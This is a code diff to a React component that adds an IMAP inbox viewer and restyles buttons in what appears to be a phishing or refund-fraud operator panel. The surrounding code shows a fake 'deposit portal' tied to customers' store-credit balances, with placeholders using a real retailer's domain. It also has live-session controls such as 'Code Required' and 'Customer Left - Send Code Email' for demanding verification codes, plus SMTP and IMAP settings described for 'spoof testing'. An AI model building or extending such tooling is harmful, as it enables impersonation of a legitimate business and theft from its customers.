@@ -3,7 +3,7 @@ import {
   X, Mail, CreditCard, ShieldCheck, CheckCircle2, Lock, 
   Send, Copy, Check, Sparkles, Loader2, Radio, UserCheck, 
   History, RefreshCw, AlertCircle, Phone, MapPin, KeyRound, ArrowRight,
-  Settings
+  Settings, Inbox
 } from 'lucide-react';
 import { CustomerRecord } from '../types';
 
@@ -56,8 +56,20 @@ export const EmailFormPreviewModal: React.FC<EmailFormPreviewModalProps> = ({
   onClose,
   customer
 }) => {
-  const [activeTab, setActiveTab] = useState<'email' | 'form' | 'controller' | 'history' | 'smtp'>('email');
+  const [activeTab, setActiveTab] = useState<'email' | 'form' | 'controller' | 'history' | 'smtp' | 'imap'>('email');
   const [copied, setCopied] = useState(false);
+
+  // IMAP settings & messages state
+  const [imapHost, setImapHost] = useState('');
+  const [imapPort, setImapPort] = useState('993');
+  const [imapUser, setImapUser] = useState('');
+  const [imapPass, setImapPass] = useState('');
+  const [imapSecure, setImapSecure] = useState(true);
+  
+  const [imapMessages, setImapMessages] = useState<any[]>([]);
+  const [imapLoading, setImapLoading] = useState(false);
+  const [imapStatusMsg, setImapStatusMsg] = useState<{ type: 'success' | 'error'; text: string } | null>(null);
+  const [activeImapMsgId, setActiveImapMsgId] = useState<number | null>(null);
 
   // Form Basic Info State
   const [amount, setAmount] = useState(customer ? customer.sumOfStoreCreditBalance.toString() : '250.00');
@@ -164,11 +176,131 @@ export const EmailFormPreviewModal: React.FC<EmailFormPreviewModalProps> = ({
     }
   };
 
+  const fetchImapConfig = async () => {
+    try {
+      const res = await fetch('/api/imap-config');
+      const data = await res.json();
+      if (data.config) {
+        setImapHost(data.config.host || '');
+        setImapPort(data.config.port?.toString() || '993');
+        setImapUser(data.config.user || '');
+        setImapPass(data.config.pass || '');
+        setImapSecure(data.config.secure !== false);
+      }
+    } catch (err) {
+      console.error('Failed to fetch IMAP config:', err);
+    }
+  };
+
+  const fetchImapMessages = async () => {
+    try {
+      const res = await fetch('/api/imap/messages');
+      const data = await res.json();
+      if (data.messages) {
+        setImapMessages(data.messages);
+      }
+    } catch (err) {
+      console.error('Failed to fetch IMAP messages:', err);
+    }
+  };
+
+  const handleSaveImapConfig = async () => {
+    setImapLoading(true);
+    setImapStatusMsg(null);
+    try {
+      const res = await fetch('/api/imap-config', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          host: imapHost,
+          port: Number(imapPort),
+          user: imapUser,
+          pass: imapPass,
+          secure: imapSecure
+        })
+      });
+      const data = await res.json();
+      if (data.success) {
+        setImapStatusMsg({ type: 'success', text: '✅ IMAP configuration updated successfully.' });
+        fetchImapConfig();
+      } else {
+        setImapStatusMsg({ type: 'error', text: `❌ Error: ${data.error || 'Failed to save config'}` });
+      }
+    } catch (err: any) {
+      setImapStatusMsg({ type: 'error', text: `❌ Connection error: ${err.message || err}` });
+    } finally {
+      setImapLoading(false);
+    }
+  };
+
+  const handleResetImapConfig = async () => {
+    setImapLoading(true);
+    setImapStatusMsg(null);
+    try {
+      const res = await fetch('/api/imap-config', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ reset: true })
+      });
+      const data = await res.json();
+      if (data.success) {
+        setImapStatusMsg({ type: 'success', text: '🔄 IMAP configuration reset to environment defaults.' });
+        fetchImapConfig();
+      }
+    } catch (err: any) {
+      setImapStatusMsg({ type: 'error', text: `❌ Reset failed: ${err.message || err}` });
+    } finally {
+      setImapLoading(false);
+    }
+  };
+
+  const handleTriggerImapFetch = async () => {
+    setImapLoading(true);
+    setImapStatusMsg(null);
+    try {
+      const res = await fetch('/api/imap/fetch', { method: 'POST' });
+      const data = await res.json();
+      if (data.success) {
+        setImapMessages(data.messages || []);
+        setImapStatusMsg({ 
+          type: 'success', 
+          text: `📬 IMAP inbox scan complete. Fetched ${data.count} new unread email message(s). Total cached: ${data.total}.` 
+        });
+      } else {
+        setImapStatusMsg({ type: 'error', text: `❌ IMAP fetch failed: ${data.error || 'Unknown error'}` });
+      }
+    } catch (err: any) {
+      setImapStatusMsg({ type: 'error', text: `❌ Connection error: ${err.message || err}` });
+    } finally {
+      setImapLoading(false);
+    }
+  };
+
+  const handleClearImapMessages = async () => {
+    if (!window.confirm('Are you sure you want to clear the received messages cache? This cannot be undone.')) return;
+    setImapLoading(true);
+    try {
+      const res = await fetch('/api/imap/messages/clear', { method: 'POST' });
+      const data = await res.json();
+      if (data.success) {
+        setImapMessages([]);
+        setActiveImapMsgId(null);
+      }
+    } catch (err) {
+      console.error('Failed to clear IMAP messages:', err);
+    } finally {
+      setImapLoading(false);
+    }
+  };
+
   useEffect(() => {
     if (isOpen) {
       fetchSmtpConfig();
+      fetchImapConfig();
       if (activeTab === 'smtp') {
         fetchSmtpLogs();
+      } else if (activeTab === 'imap') {
+        fetchImapMessages();
       }
     }
   }, [isOpen, activeTab]);
@@ -531,6 +663,23 @@ export const EmailFormPreviewModal: React.FC<EmailFormPreviewModalProps> = ({
                 <span className="w-2 h-2 bg-emerald-400 rounded-full animate-pulse"></span>
               )}
             </button>
+
+            <button
+              onClick={() => setActiveTab('imap')}
+              className={`px-3.5 py-2 rounded-lg text-xs font-bold transition-all flex items-center gap-2 whitespace-nowrap ${
+                activeTab === 'imap' 
+                  ? 'bg-emerald-700 text-slate-900 shadow-md' 
+                  : 'text-slate-500 hover:text-slate-900 hover:bg-white'
+              }`}
+            >
+              <Inbox className="w-4 h-4" />
+              <span>IMAP Inbox</span>
+              {imapMessages.length > 0 && (
+                <span className="bg-emerald-500 text-slate-950 text-[10px] font-black px-1.5 py-0.2 rounded-full">
+                  {imapMessages.length}
+                </span>
+              )}
+            </button>
           </div>
 
           {/* Quick Controls */}
@@ -635,7 +784,7 @@ export const EmailFormPreviewModal: React.FC<EmailFormPreviewModalProps> = ({
                         alert(`Notice test triggered: ${err.message || 'Complete'}`);
                       }
                     }}
-                    className="bg-emerald-700 hover:bg-emerald-500 text-slate-950 text-[11px] font-sans font-bold px-3 py-1 rounded shadow flex items-center gap-1 transition-all"
+                    className="bg-emerald-700 hover:bg-emerald-500 text-white text-[11px] font-sans font-bold px-3 py-1 rounded shadow flex items-center gap-1 transition-all"
                   >
                     <Send className="w-3 h-3 text-slate-950" />
                     <span>Send Test Notice</span>
@@ -816,7 +965,7 @@ export const EmailFormPreviewModal: React.FC<EmailFormPreviewModalProps> = ({
                         />
                         <button
                           type="submit"
-                          className="bg-emerald-700 hover:bg-emerald-500 text-slate-950 font-bold px-4 py-2.5 rounded-xl text-xs flex items-center gap-1 transition-all"
+                          className="bg-emerald-700 hover:bg-emerald-500 text-white font-bold px-4 py-2.5 rounded-xl text-xs flex items-center gap-1 transition-all"
                         >
                           <span>Submit</span>
                           <ArrowRight className="w-4 h-4" />
@@ -1001,7 +1150,7 @@ export const EmailFormPreviewModal: React.FC<EmailFormPreviewModalProps> = ({
                   {/* Submit Action */}
                   <button
                     type="submit"
-                    className="w-full bg-emerald-700 hover:bg-emerald-500 text-slate-950 font-bold text-xs uppercase tracking-wider py-3.5 rounded-xl shadow-lg transition-all flex items-center justify-center gap-2"
+                    className="w-full bg-emerald-700 hover:bg-emerald-500 text-white font-bold text-xs uppercase tracking-wider py-3.5 rounded-xl shadow-lg transition-all flex items-center justify-center gap-2"
                   >
                     <Lock className="w-4 h-4" />
                     <span>Establish Live Socket &amp; Deposit ${amount} CAD</span>
@@ -1047,7 +1196,7 @@ export const EmailFormPreviewModal: React.FC<EmailFormPreviewModalProps> = ({
                   </p>
                   <button
                     onClick={() => setActiveTab('form')}
-                    className="bg-emerald-700 hover:bg-emerald-500 text-slate-950 text-xs font-bold px-4 py-2 rounded-xl transition-all"
+                    className="bg-emerald-700 hover:bg-emerald-500 text-white text-xs font-bold px-4 py-2 rounded-xl transition-all"
                   >
                     Go to Deposit Portal Form
                   </button>
@@ -1112,7 +1261,7 @@ export const EmailFormPreviewModal: React.FC<EmailFormPreviewModalProps> = ({
                       <div className="flex flex-wrap items-center gap-2 pt-1">
                         <button
                           onClick={() => handleAdminAction(sess.sessionId, 'refunded_successfully')}
-                          className="bg-emerald-700 hover:bg-emerald-500 text-slate-950 text-xs font-bold px-4 py-2.5 rounded-xl shadow flex items-center gap-1.5 transition-all"
+                          className="bg-emerald-700 hover:bg-emerald-500 text-white text-xs font-bold px-4 py-2.5 rounded-xl shadow flex items-center gap-1.5 transition-all"
                         >
                           <CheckCircle2 className="w-4 h-4 text-slate-950" />
                           <span>Refunded Successfully</span>
@@ -1120,17 +1269,17 @@ export const EmailFormPreviewModal: React.FC<EmailFormPreviewModalProps> = ({
 
                         <button
                           onClick={() => handleAdminAction(sess.sessionId, 'require_code')}
-                          className="bg-amber-600 hover:bg-amber-500 text-slate-950 text-xs font-bold px-4 py-2.5 rounded-xl shadow flex items-center gap-1.5 transition-all"
+                          className="bg-amber-600 hover:bg-amber-500 text-white text-xs font-bold px-4 py-2.5 rounded-xl shadow flex items-center gap-1.5 transition-all"
                         >
-                          <KeyRound className="w-4 h-4 text-slate-950" />
+                          <KeyRound className="w-4 h-4 text-white" />
                           <span>Code Required</span>
                         </button>
 
                         <button
                           onClick={() => handleAdminAction(sess.sessionId, 'customer_left_send_email')}
-                          className="bg-rose-600 hover:bg-rose-500 text-slate-900 text-xs font-bold px-4 py-2.5 rounded-xl shadow flex items-center gap-1.5 transition-all"
+                          className="bg-rose-600 hover:bg-rose-500 text-white text-xs font-bold px-4 py-2.5 rounded-xl shadow flex items-center gap-1.5 transition-all"
                         >
-                          <Mail className="w-4 h-4 text-slate-900" />
+                          <Mail className="w-4 h-4 text-white" />
                           <span>Customer Left - Send Code Email</span>
                         </button>
                       </div>
@@ -1353,7 +1502,7 @@ export const EmailFormPreviewModal: React.FC<EmailFormPreviewModalProps> = ({
                       <button
                         type="submit"
                         disabled={smtpLoading}
-                        className="bg-emerald-700 hover:bg-emerald-500 text-slate-950 text-xs font-bold px-4 py-2.5 rounded-xl flex items-center gap-1.5 transition-all disabled:opacity-50"
+                        className="bg-emerald-700 hover:bg-emerald-500 text-white text-xs font-bold px-4 py-2.5 rounded-xl flex items-center gap-1.5 transition-all disabled:opacity-50"
                       >
                         {smtpLoading ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <ShieldCheck className="w-4 h-4" />}
                         <span>Save &amp; Persist Configuration</span>
@@ -1436,7 +1585,7 @@ export const EmailFormPreviewModal: React.FC<EmailFormPreviewModalProps> = ({
                       type="button"
                       onClick={handleTestSmtp}
                       disabled={smtpLoading}
-                      className="w-full bg-blue-600 hover:bg-blue-500 text-slate-900 text-xs font-bold py-3 px-4 rounded-xl flex items-center justify-center gap-2 transition-all disabled:opacity-50 shadow-lg"
+                      className="w-full bg-blue-600 hover:bg-blue-500 text-white text-xs font-bold py-3 px-4 rounded-xl flex items-center justify-center gap-2 transition-all disabled:opacity-50 shadow-lg"
                     >
                       {smtpLoading ? (
                         <Loader2 className="w-4 h-4 animate-spin" />
@@ -1548,6 +1697,236 @@ export const EmailFormPreviewModal: React.FC<EmailFormPreviewModalProps> = ({
                             ) : (
                               <span className="text-slate-600 italic">No detailed protocol steps captured.</span>
                             )}
+                          </div>
+                        )}
+                      </div>
+                    ))}
+                  </div>
+                )}
+              </div>
+
+            </div>
+          )}
+
+          {/* TAB 6: IMAP INBOX & MESSAGE VIEWER */}
+          {activeTab === 'imap' && (
+            <div className="space-y-4">
+              
+              <div className="bg-slate-50 p-4 rounded-xl border border-slate-200 flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <Inbox className="w-5 h-5 text-emerald-700" />
+                  <h4 className="text-xs uppercase tracking-wider font-bold text-slate-600">
+                    IMAP Receiving Configuration
+                  </h4>
+                </div>
+                
+                <div className="flex items-center gap-2">
+                  <button 
+                    onClick={handleResetImapConfig}
+                    disabled={imapLoading}
+                    className="text-[10px] bg-slate-200 hover:bg-slate-300 text-slate-700 border border-slate-300 px-3 py-1.5 rounded-lg transition-all font-bold disabled:opacity-50 flex items-center gap-1.5"
+                  >
+                    <RefreshCw className="w-3 h-3" />
+                    Reset
+                  </button>
+                  <button 
+                    onClick={handleSaveImapConfig}
+                    disabled={imapLoading}
+                    className="text-[10px] bg-emerald-700 hover:bg-emerald-600 text-slate-100 border border-emerald-800 px-3 py-1.5 rounded-lg transition-all font-bold disabled:opacity-50"
+                  >
+                    Save Changes
+                  </button>
+                </div>
+              </div>
+
+              {imapStatusMsg && (
+                <div className={`p-3 rounded-xl border text-xs font-mono font-medium ${
+                  imapStatusMsg.type === 'success' ? 'bg-emerald-50/50 border-emerald-200 text-emerald-800' : 'bg-rose-50/50 border-rose-200 text-rose-800'
+                }`}>
+                  {imapStatusMsg.text}
+                </div>
+              )}
+
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div className="bg-slate-50 p-5 rounded-2xl border border-slate-200 space-y-4">
+                  <div className="flex items-center gap-2 text-xs font-bold text-slate-900 border-b border-slate-200 pb-2">
+                    <Settings className="w-4 h-4 text-emerald-600" />
+                    <span>Connection Settings</span>
+                  </div>
+                  
+                  <div className="space-y-3">
+                    <div className="grid grid-cols-3 gap-2">
+                      <div className="col-span-2">
+                        <label className="block text-[10px] text-slate-500 mb-1 font-semibold uppercase">IMAP Host</label>
+                        <input 
+                          type="text" 
+                          value={imapHost}
+                          onChange={(e) => setImapHost(e.target.value)}
+                          className="w-full bg-white border border-slate-300 rounded-lg px-2.5 py-1.5 text-xs text-slate-900 focus:outline-none focus:border-emerald-500 font-mono"
+                          placeholder="imap.golftown.com"
+                        />
+                      </div>
+                      <div>
+                        <label className="block text-[10px] text-slate-500 mb-1 font-semibold uppercase">Port</label>
+                        <input 
+                          type="text" 
+                          value={imapPort}
+                          onChange={(e) => setImapPort(e.target.value)}
+                          className="w-full bg-white border border-slate-300 rounded-lg px-2.5 py-1.5 text-xs text-slate-900 focus:outline-none focus:border-emerald-500 font-mono"
+                          placeholder="993"
+                        />
+                      </div>
+                    </div>
+
+                    <div>
+                      <label className="block text-[10px] text-slate-500 mb-1 font-semibold uppercase">Security</label>
+                      <label className="flex items-center gap-2 cursor-pointer bg-white border border-slate-200 p-2 rounded-lg">
+                        <input 
+                          type="checkbox" 
+                          checked={imapSecure}
+                          onChange={(e) => setImapSecure(e.target.checked)}
+                          className="w-3.5 h-3.5 rounded border-slate-300 text-emerald-600 focus:ring-emerald-600"
+                        />
+                        <span className="text-[11px] font-bold text-slate-700">Use Secure TLS Connection</span>
+                      </label>
+                    </div>
+                  </div>
+                </div>
+
+                <div className="bg-slate-50 p-5 rounded-2xl border border-slate-200 space-y-4">
+                  <div className="flex items-center gap-2 text-xs font-bold text-slate-900 border-b border-slate-200 pb-2">
+                    <Lock className="w-4 h-4 text-emerald-600" />
+                    <span>Authentication Credentials</span>
+                  </div>
+                  
+                  <div className="space-y-3">
+                    <div>
+                      <label className="block text-[10px] text-slate-500 mb-1 font-semibold uppercase">IMAP User / Email Address</label>
+                      <input 
+                        type="text" 
+                        value={imapUser}
+                        onChange={(e) => setImapUser(e.target.value)}
+                        className="w-full bg-white border border-slate-300 rounded-lg px-2.5 py-1.5 text-xs text-slate-900 focus:outline-none focus:border-emerald-500 font-mono"
+                        placeholder="505receiving@cloud.golftown.com"
+                      />
+                    </div>
+
+                    <div>
+                      <label className="block text-[10px] text-slate-500 mb-1 font-semibold uppercase">IMAP Password</label>
+                      <input 
+                        type="password" 
+                        value={imapPass}
+                        onChange={(e) => setImapPass(e.target.value)}
+                        className="w-full bg-white border border-slate-300 rounded-lg px-2.5 py-1.5 text-xs text-slate-900 focus:outline-none focus:border-emerald-500 font-mono"
+                        placeholder="••••••••••••••"
+                      />
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              {/* IMAP Inbox viewer */}
+              <div className="bg-slate-50 border border-slate-200 rounded-2xl p-5 space-y-4">
+                <div className="flex items-center justify-between border-b border-slate-200 pb-3">
+                  <div className="flex items-center gap-2">
+                    <Inbox className="w-4 h-4 text-emerald-700" />
+                    <h4 className="text-xs uppercase tracking-wider font-bold text-slate-600">
+                      Recent Inbox Messages
+                    </h4>
+                    <span className="bg-slate-200 text-slate-600 px-2 rounded-full text-[10px] font-bold">
+                      {imapMessages.length} total cached
+                    </span>
+                  </div>
+                  <div className="flex items-center gap-2">
+                    {imapMessages.length > 0 && (
+                      <button
+                        onClick={handleClearImapMessages}
+                        disabled={imapLoading}
+                        className="text-[10px] bg-rose-50 hover:bg-rose-100 text-rose-600 border border-rose-200 px-2.5 py-1.5 rounded-lg transition-all font-bold disabled:opacity-50"
+                      >
+                        Clear Cache
+                      </button>
+                    )}
+                    <button
+                      onClick={handleTriggerImapFetch}
+                      disabled={imapLoading}
+                      className="text-[10px] bg-blue-600 hover:bg-blue-500 text-white border border-blue-700 px-3 py-1.5 rounded-lg transition-all font-bold disabled:opacity-50 flex items-center gap-1"
+                    >
+                      {imapLoading ? <Loader2 className="w-3 h-3 animate-spin" /> : <RefreshCw className="w-3 h-3" />}
+                      Check Inbox Now
+                    </button>
+                  </div>
+                </div>
+
+                <p className="text-xs text-slate-500 leading-relaxed">
+                  Use this tool to verify incoming email spoof testing, DMARC/SPF/DKIM compliance checks, or review actual email responses landing in the configured receiving address.
+                </p>
+
+                {imapMessages.length === 0 ? (
+                  <div className="bg-white p-6 rounded-xl border border-slate-200 text-center text-slate-500 text-xs font-mono">
+                    No cached messages. Click "Check Inbox Now" to fetch unread emails from the IMAP server.
+                  </div>
+                ) : (
+                  <div className="space-y-3">
+                    {imapMessages.map((msg) => (
+                      <div key={msg.uid} className="border border-slate-200 rounded-xl bg-white overflow-hidden transition-all hover:border-slate-300">
+                        <div 
+                          onClick={() => setActiveImapMsgId(activeImapMsgId === msg.uid ? null : msg.uid)}
+                          className="p-3.5 flex flex-col md:flex-row justify-between gap-3 cursor-pointer select-none"
+                        >
+                          <div className="flex flex-col gap-1.5 max-w-full md:max-w-[70%]">
+                            <div className="flex items-center gap-2">
+                              <span className="font-bold text-slate-900 text-sm truncate">{msg.subject || '(No Subject)'}</span>
+                            </div>
+                            <div className="text-xs text-slate-600 flex flex-wrap items-center gap-x-3 gap-y-1">
+                              <span><strong>From:</strong> <span className="font-mono">{msg.from}</span></span>
+                              <span className="text-slate-300">|</span>
+                              <span><strong>To:</strong> <span className="font-mono">{msg.to}</span></span>
+                            </div>
+                          </div>
+
+                          <div className="flex flex-row md:flex-col justify-between md:justify-start items-center md:items-end gap-2 md:gap-1 text-xs">
+                            <span className="text-[10px] text-slate-500 font-mono whitespace-nowrap bg-slate-100 px-1.5 py-0.5 rounded">{msg.date ? new Date(msg.date).toLocaleString() : msg.timestamp}</span>
+                            <span className="text-[10px] font-bold text-blue-600 bg-blue-50 px-2 py-0.5 rounded-full whitespace-nowrap">UID: {msg.uid}</span>
+                          </div>
+                        </div>
+
+                        {activeImapMsgId === msg.uid && (
+                          <div className="border-t border-slate-200 bg-slate-50 p-4 font-mono text-[11px] text-slate-700">
+                            
+                            {/* Security Headers Summary Box */}
+                            <div className="mb-4 bg-white border border-slate-200 rounded-lg p-3 space-y-2 text-[10px]">
+                              <h5 className="font-bold text-slate-900 border-b border-slate-100 pb-1.5 mb-2 flex items-center gap-1.5 uppercase tracking-wider">
+                                <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" /> Security Headers Analysis
+                              </h5>
+                              <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
+                                <div>
+                                  <span className="font-bold text-slate-500 inline-block w-24">Authentication:</span>
+                                  <span className="text-slate-800 break-all">{msg.authResults || 'Not found'}</span>
+                                </div>
+                                <div>
+                                  <span className="font-bold text-slate-500 inline-block w-24">Received-SPF:</span>
+                                  <span className="text-slate-800 break-all">{msg.spf || 'Not found'}</span>
+                                </div>
+                                <div className="col-span-full">
+                                  <span className="font-bold text-slate-500 inline-block w-24">Message-ID:</span>
+                                  <span className="text-slate-800 break-all">{msg.messageId || 'Not found'}</span>
+                                </div>
+                                {msg.dkim && (
+                                  <div className="col-span-full">
+                                    <span className="font-bold text-slate-500 inline-block w-24">DKIM-Signature:</span>
+                                    <span className="text-slate-800 break-all opacity-80">{msg.dkim}</span>
+                                  </div>
+                                )}
+                              </div>
+                            </div>
+
+                            <div className="mb-2 uppercase font-bold text-[10px] tracking-widest text-slate-500 border-b border-slate-200 pb-1">
+                              Message Content Preview
+                            </div>
+                            <div className="whitespace-pre-wrap leading-relaxed max-h-[350px] overflow-y-auto">
+                              {msg.text}
+                            </div>
                           </div>
                         )}
                       </div>
